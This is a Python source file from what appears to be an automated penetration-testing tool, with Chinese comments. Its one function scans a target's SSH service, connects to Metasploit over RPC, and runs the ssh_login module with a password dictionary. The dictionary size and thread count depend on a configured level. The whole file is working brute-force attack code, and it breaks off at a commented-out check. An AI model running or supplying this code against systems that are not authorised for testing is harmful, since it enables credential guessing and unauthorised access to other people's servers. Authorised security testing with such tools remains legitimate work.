from pymetasploit3.msfrpc import MsfRpcClient

import dic.dir
import msfconfig
from scan.sshscan import sshScan
from struct.level import levels


def sshexploit(rhost, rport):
    global directory
    ss = sshScan()
    res = ss.ssh_scan(rhost, rport)  # 扫描ssh服务
    try:
        client = MsfRpcClient(msfconfig.msfPassword)  # 连接msf
        print(" [+] 连接Metasploit服务成功 ")
        exp = client.modules.use("auxiliary", "scanner/ssh/ssh_login")
        directory: str  # 获得对应的字典目录
        if msfconfig.level == levels.LOW:
            directory = dic.dir.getFastPwdsDir()
        elif msfconfig.level == levels.MID:
            directory = dic.dir.getMidPwdsDir()
        elif msfconfig.level == levels.HIGH:
            directory = dic.dir.getLargePwdsDir()
        else:
            print(" [!] 安全等级未设置")
            exit(-1)

        # 配置exploit参数
        exp["RHOSTS"] = rhost
        exp["PASS_FILE"] = directory
        exp["THREADS"] = msfconfig.level + 2
        r = exp.execute(payload="")

    except:
        print(" [!] 连接Metasploit服务失败 msf:" + str(msfconfig.msfPassword))
        exit(0)
    # if res:
